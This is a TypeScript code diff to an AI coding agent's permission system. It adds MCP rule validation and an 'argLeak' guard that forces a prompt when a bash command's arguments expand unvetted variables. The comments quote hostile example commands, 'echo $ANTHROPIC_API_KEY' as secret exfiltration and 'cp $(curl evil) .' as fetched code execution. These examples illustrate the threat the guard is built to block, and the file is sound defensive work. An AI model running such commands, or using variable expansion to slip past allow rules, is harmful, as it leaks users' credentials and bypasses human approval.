@@ -458,7 +458,7 @@ export type PermissionDecisionReason =
   | { type: 'other'; message?: string };
 
 export const SAFETY_CHECK_KINDS = [
-  'credential', 'systemDir', 'suspiciousPath', 'agentConfig', 'buildConfig', 'destructive', 'codeExec', 'toctou',
+  'credential', 'systemDir', 'suspiciousPath', 'agentConfig', 'buildConfig', 'destructive', 'codeExec', 'toctou', 'argLeak',
 ] as const;
 export type SafetyCheckKind = (typeof SAFETY_CHECK_KINDS)[number];
 
@@ -3421,6 +3421,37 @@ export function permissionRuleValueToString(ruleValue: PermissionRuleValue): str
   return `${ruleValue.toolName}(${escapeRuleContent(ruleValue.ruleContent)})`;
 }
 
+/**
+ * Parse an `mcp__server[__tool]` permission-rule tool name into its parts, or
+ * `null` when the name is not an MCP rule. Mirrors Claude's `mcpInfoFromString`
+ * (services/mcp/mcpStringUtils.ts): the first two `__`-delimited segments are
+ * the `mcp` marker and the server name; everything after is re-joined so a tool
+ * name containing `__` survives (`mcp__srv__a__b` → tool `a__b`). A missing
+ * server segment (`mcp__`, `mcp`) is not a valid MCP rule and returns `null`.
+ */
+export function mcpInfoFromString(
+  toolString: string,
+): { serverName: string; toolName: string | undefined } | null {
+  const parts = toolString.split('__');
+  const [mcpPart, serverName, ...toolNameParts] = parts;
+  if (mcpPart !== 'mcp' || !serverName) return null;
+  return {
+    serverName,
+    toolName: toolNameParts.length > 0 ? toolNameParts.join('__') : undefined,
+  };
+}
+
+/** Count unescaped occurrences of `char` in `str` (odd preceding backslash run
+ *  = escaped). Shared by the MCP rule validator so `mcp__srv\(x\)` is inspected
+ *  as a literal, not a pattern. Mirrors Claude's `countUnescapedChar`. */
+function countUnescapedChar(str: string, char: string): number {
+  let count = 0;
+  for (let i = 0; i < str.length; i++) {
+    if (str[i] === char && !isEscapedAt(str, i)) count++;
+  }
+  return count;
+}
+
 /** The three behaviors a permission rule can carry. Mirrors Claude's
  *  `permissionBehavior` enum; identical to {@link PermissionRule.action}. */
 export type PermissionBehavior = 'allow' | 'deny' | 'ask';
@@ -3746,6 +3777,30 @@ export function validatePermissionRule(rule: string): {
   if (!parsed.toolName || parsed.toolName.length === 0) {
     return { valid: false, error: 'Tool name cannot be empty' };
   }
+  // MCP-rule validation (before the generic tool checks). An MCP rule scopes a
+  // whole server (`mcp__server`), all its tools (`mcp__server__*`), or one tool
+  // (`mcp__server__tool`) — it never carries a parenthesized pattern. Check BOTH
+  // the parsed ruleContent AND the raw '(' count, because the parser normalizes a
+  // standalone wildcard (`mcp__server(*)`) to a pattern-less name. Mirrors
+  // Claude's permissionValidation MCP branch.
+  const mcpInfo = mcpInfoFromString(parsed.toolName);
+  if (mcpInfo) {
+    if (parsed.ruleContent !== undefined || countUnescapedChar(rule, '(') > 0) {
+      return {
+        valid: false,
+        error: 'MCP rules do not support patterns in parentheses',
+        suggestion: `Use "${parsed.toolName}" without parentheses, or use "mcp__${mcpInfo.serverName}__*" for all tools`,
+        examples: [
+          `mcp__${mcpInfo.serverName}`,
+          `mcp__${mcpInfo.serverName}__*`,
+          mcpInfo.toolName && mcpInfo.toolName !== '*'
+            ? `mcp__${mcpInfo.serverName}__${mcpInfo.toolName}`
+            : undefined,
+        ].filter(Boolean) as string[],
+      };
+    }
+    return { valid: true };
+  }
   // Bash prefix-rule mistakes: `:*` must be at the end and non-empty.
   if ((parsed.toolName === 'bash' || parsed.toolName === 'Bash') && parsed.ruleContent !== undefined) {
     const content = parsed.ruleContent;
@@ -3942,6 +3997,69 @@ function matchBashPattern(pattern: string, command: string, ruleAction: 'allow' 
   for (const inner of extractCommandSubstitutions(normalized)) {
     for (const sub of splitCompoundCommand(inner)) {
       if (matchBashSub(pattern, sub, ruleAction)) return true;
+    }
+  }
+  return false;
+}
+
+/** Strip single-quoted spans — in bash their contents are fully literal (no
+ *  `$`/backtick/`$(…)` expansion), so a `$SECRET` inside `'…'` is inert. Double
+ *  quotes are kept because they DO expand. Single quotes cannot be escaped in
+ *  bash, so no backslash handling is needed. */
+function stripSingleQuotedSpans(s: string): string {
+  let out = '';
+  let inSingle = false;
+  for (let i = 0; i < s.length; i++) {
+    const c = s[i]!;
+    if (c === "'") { inSingle = !inSingle; continue; }
+    if (!inSingle) out += c;
+  }
+  return out;
+}
+
+/** True when a single argument token carries a VARIABLE expansion whose value
+ *  an allow rule never vetted: a reference `$NAME` / `${NAME}` / `$env:NAME`
+ *  whose name is not a vetted {@link SAFE_ENV_VARS} entry. Arithmetic `$((…))`
+ *  and special/positional params (`$1`, `$@`, `$?`, `$$`) are not value leaks.
+ *  Command substitutions (`$(…)` / backtick) are intentionally NOT handled here
+ *  — AMI already decomposes substitutions in the deny/ask matcher (and elevates
+ *  a destructive inner to a prompt), so folding them in would both regress the
+ *  "benign `$(date)` stays allowed" behavior and duplicate that path. */
+function argTokenLeaksValue(token: string): boolean {
+  // Named variable expansion: `$NAME`, `${NAME}`, or PowerShell-style `$env:NAME`.
+  const re = /\$\{?(?:env:)?([A-Za-z_][A-Za-z0-9_]*)/g;
+  let m: RegExpExecArray | null;
+  while ((m = re.exec(token)) !== null) {
+    if (!SAFE_ENV_VARS.has(m[1]!)) return true;
+  }
+  return false;
+}
+
+/**
+ * True when ANY argument of ANY sub-command expands a non-vetted variable — i.e.
+ * a user `allow` rule on the command would NOT cover what the expansion actually
+ * injects. A user who writes `Bash(echo:*)` asserts that running `echo` is safe,
+ * not that `echo $ANTHROPIC_API_KEY` (secret exfiltration) or
+ * `echo $env:ANTHROPIC_API_KEY` is safe. The permission engine uses this to
+ * withhold allow-rule auto-approval for such a command and force an explicit
+ * prompt.
+ *
+ * Mirrors Claude Code's `argLeaksValue` (PowerShell `readOnlyValidation.ts`),
+ * ported to bash variable-expansion syntax: command-word position is exempt (it
+ * is what the allow rule names); only ARGUMENTS are inspected. A reference to a
+ * vetted {@link SAFE_ENV_VARS} name (`$NODE_ENV`, `$LANG`) is NOT a leak — those
+ * are the same names stripped from an allow-rule env prefix, so the two paths
+ * agree on what counts as a safe environment passthrough. Command substitutions
+ * are handled separately by the deny/ask substitution-decomposition path.
+ */
+export function bashCommandArgLeaksValue(command: string): boolean {
+  const normalized = normalizeLineContinuations(command);
+  for (const sub of splitCompoundCommand(normalized)) {
+    const stripped = stripSingleQuotedSpans(sub).trim();
+    if (!stripped) continue;
+    const tokens = stripped.split(/\s+/);
+    for (let i = 1; i < tokens.length; i++) {
+      if (argTokenLeaksValue(tokens[i]!)) return true;
     }
   }
   return false;
@@ -4555,6 +4673,21 @@ export class PermissionManager {
       return 'deny';
     }
 
+    // argLeaksValue guard — an `allow` rule must NOT auto-approve a bash command
+    // whose ARGUMENTS expand a non-vetted variable (secret exfil, e.g.
+    // `echo $ANTHROPIC_API_KEY`) or a command substitution (arbitrary code, e.g.
+    // `cp $(curl evil) .`): the rule asserts the COMMAND is safe, not that
+    // arbitrary expansion through it is. Fires in the rule-evaluated modes (deny
+    // already resolved above and still wins), forcing an explicit prompt. Mirrors
+    // Claude's argLeaksValue allow-path gate. A vetted SAFE_ENV_VARS reference
+    // (`$NODE_ENV`) is not a leak and stays auto-approvable.
+    if ((this.mode === 'ask' || this.mode === 'acceptEdits') &&
+        toolName === 'bash' && typeof input.command === 'string' &&
+        bashCommandArgLeaksValue(input.command)) {
+      if (this._memo) this._memo.set(toolName, this._hashInput(input), 'ask');
+      return 'ask';
+    }
+
     // Evaluate allow/ask rules in order (first match wins). Deny rules were already
     // resolved above and unconditionally win, so they are skipped here.
     for (const rule of this.rules) {
@@ -4692,6 +4825,15 @@ export class PermissionManager {
       const toctou = this.bashToctouEscalation(command);
       if (toctou !== null) {
         return { type: 'safetyCheck', check: 'toctou', message: `Command requires approval: ${toctou}` };
+      }
+      // argLeaksValue: the ask verdict came from an allow rule being withheld
+      // because an argument expands a non-vetted variable / command substitution.
+      if (decision === 'ask' && (this.mode === 'ask' || this.mode === 'acceptEdits') &&
+          bashCommandArgLeaksValue(command)) {
+        return {
+          type: 'safetyCheck', check: 'argLeak',
+          message: 'Command expands a variable or command substitution its allow rule did not vet and requires approval',
+        };
       }
       // Code-execution allow-rule downgrade: the ask verdict came from a matched
       // over-broad interpreter / package-runner / shell allow rule, not the mode.
